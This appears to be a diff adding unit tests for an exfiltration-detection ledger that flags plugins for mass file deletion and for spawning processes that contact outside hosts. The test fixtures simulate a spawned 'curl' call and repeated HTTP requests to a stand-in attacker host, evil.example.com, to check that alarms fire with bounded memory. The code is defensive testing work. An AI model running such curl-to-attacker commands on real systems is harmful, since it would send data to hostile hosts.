@@ -382,3 +382,39 @@ describe('N3 台账：n3-exfil 终身误报修复', () => {
     }
   })
 })
+
+describe('round-16 S2：窗口数组计数上限（防无界增长 + O(n²)）', () => {
+  it('10s 内 5000 次删除 → stateSize 有界（≤ 2048），MASS_DELETE 照常触发', () => {
+    const l = new ExfilLedger({ massDeleteN: 20 })
+    for (let i = 0; i < 5000; i++) {
+      l.observeFs(fsEvt({ plugin: 'cap', op: 'unlink', target: '/tmp/cap' + i, sensitive: false }))
+    }
+    const size = l.stateSize('cap')!
+    expect(size).toBeLessThanOrEqual(2048)
+    expect(size).toBeGreaterThan(0)
+    const alarms = l.observeFs(fsEvt({ plugin: 'cap', op: 'unlink', target: '/tmp/trigger' }))
+    expect(alarms.some(a => a.kind === 'n3-mass-delete')).toBe(true)
+  })
+
+  it('spawn+net 大窗口关联：2000 目标 × 2001 连接仍命中一次（O(n+m) 单指针）', () => {
+    const l = new ExfilLedger()
+    for (let i = 0; i < 2000; i++) {
+      l.observeFs({
+        module: 'child_process', op: 'spawn', plugin: 'big',
+        target: 'curl', paths: ['curl', 'https://evil.example.com/x' + i],
+        sensitive: false, bytes: 0,
+      })
+    }
+    for (let i = 0; i < 2001; i++) {
+      l.observeNet({ plugin: 'big', module: 'http', op: 'request', hostname: 'evil.example.com', bytes: 10 })
+    }
+    expect(l.stateSize('big')!).toBeLessThanOrEqual(4096) // spawn(2000) + net(2048 封顶) 各桶有界
+    const alarms = l.observeNet({ plugin: 'big', module: 'http', op: 'request', hostname: 'evil.example.com', bytes: 10 })
+    expect(alarms.some(a => a.kind === 'n3-spawn-net-match')).toBe(true)
+  })
+
+  it('stateSize：未知插件 → undefined', () => {
+    const l = new ExfilLedger()
+    expect(l.stateSize('ghost')).toBeUndefined()
+  })
+})
